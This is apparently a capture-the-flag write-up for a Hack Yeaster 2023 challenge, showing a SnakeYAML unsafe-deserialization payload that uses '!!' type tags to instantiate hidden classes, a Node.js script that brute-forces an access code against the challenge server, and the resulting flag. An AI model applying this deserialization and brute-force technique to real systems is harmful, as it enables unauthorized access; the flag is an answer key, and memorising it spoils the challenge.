If we have a look at the site, there are multiple images which have base64 query parameter indicating which image they are serving

bmFtZTogU25ha2VzIGluIFNwYWNlCmltYWdlOiBzbmFrZXNfaW5fc3BhY2UKc291cmNlOiBEQUxMLUUKcmVzb2x1dGlvbjogMjU2eDI1Ng==

name: Snakes in Space
image: snakes_in_space
source: DALL-E
resolution: 256x256

By looking at the source code, it is easy to see that we need to try to render the 'Flag' instead of the 'Image' class.
But there are no direct references in the code. Luckily it seems like the class is included in the runtime.
We see that the input is parsed by the snakeyaml library.
After a quick google, we bounce on
https://snyk.io/blog/java-yaml-parser-with-snakeyaml/

So we need to try to generate a payload which would contain this. (com.hackyeaster.digitalsnakeart has been replaced with pkg for brevity)

```
name: Snake as a flag
image: !!pkg.Flag [!!pkg.Code [1]]
source: DALL-ME
resolution: 256x256
```

This renders the following image which probably is the same as the `snake_no_access` image referenced in the flag code.

![[Pasted image 20230413213932.png]]

So the easiest way to approach this is to find the valid code which is a number between 1 and 500 (as can be found in the code). So I would write a script which will stop once it has gotten input back which does not contain part of the base64 of the above image.

```
import fetch from 'node-fetch';

const url = 'http://ch.hackyeaster.com:2307/art?art=';

const originalPayload = `
name: Snake as a Super Hero
image: snake_as_a_super_hero
source: DALL-E
resolution: 256x256`;

const packageName = 'com.hackyeaster.digitalsnakeart'

async function doOneFetch(payload) {
    const payloadBase64 = Buffer.from(payload).toString('base64')
    const fullUrl = `${url}${payloadBase64}`;
    const data = await fetch(fullUrl)
    const text = await data.text();
    return text;
}

async function run() {
    let found = false;
    let iterator = 1;
    const totalIterations = 500;

    while(!found && iterator < totalIterations) {
        console.log('Iteration', iterator);
        const payload = `
name: Snake as a flag
image: !!${packageName}.Flag [!!${packageName}.Code [${iterator}]]
source: DALL-ME
resolution: 256x256
`;
        const result = await doOneFetch(payload);

        if (!result.includes(`1mcOf4B8pgFYl0GYSgHe2ggmgACAQcCga24d/jf/P33BbJDcFKoBnWf3PSW/Huw`)) {
            found = true;
            console.log('FOUND--', iterator, result);
        }

        iterator += 1;
    }
}

run()
```

The following script will find the correct code and console log the base64 representation of the image.
After scanning the QR, you should find the flag:

he2023{0n3_d03s_n0t_s1mply_s0lv3_th1s_chllng!}